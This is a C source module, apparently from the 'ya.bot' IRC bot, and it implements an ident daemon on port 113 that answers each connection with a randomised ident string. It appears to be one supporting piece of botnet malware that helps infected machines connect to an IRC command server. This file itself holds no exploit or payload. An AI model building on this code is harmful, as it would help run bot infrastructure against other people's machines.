/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_DAEMONIDENT
DWORD WINAPI daemon_identhandler(LPVOID param) 
{
	char szBuffer[LOWBUF];
	SOCKET csock = (SOCKET)param;

#ifndef NO_DEBUG
		debug_print("Sending ident info, daemon_identhandler()");
#endif

		srand(GetTickCount());
		_snprintf(szBuffer, sizeof(szBuffer) - 1,
				string_daemonidentmsg,
				rand() % 9999,
				rand() % 9999,
				rand() % 9999,
				"\r\n");
		send(csock, szBuffer, strlen(szBuffer), 0);
		closesocket(csock);
		return 0;
}

DWORD WINAPI daemon_identmain(LPVOID param)
{
	bool bFlag = TRUE;
	register int nSize;
	sockaddr_in sin;
	SOCKET sock, csock;

#ifndef NO_DEBUG
		debug_print("Starting ident daemon, daemon_identmain()");
#endif

		sin.sin_addr.s_addr = INADDR_ANY;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(113);
		nSize = sizeof(sin);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
			thread_remove(THREAD_DAEMONIDENT);
			return 0;
	}
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&bFlag, sizeof(bFlag)) == SOCKET_ERROR)
	{
			thread_remove(THREAD_DAEMONIDENT);
			return 0;
	}
	if (bind(sock, (sockaddr *)&sin, nSize) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONIDENT);
			return 0;
	}
	if (listen(sock, 10) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONIDENT);
			return 0;
	}
	while (TRUE)
	{
			csock = accept(sock, (sockaddr *)&sin, &nSize);
		if (csock != INVALID_SOCKET)
				CreateThread(NULL,
						0,
						&daemon_identhandler,
						(void *)csock,
						0,
						NULL);
	}
		closesocket(csock);
		closesocket(sock);
		thread_remove(THREAD_DAEMONIDENT);
		return 0;
}
#endif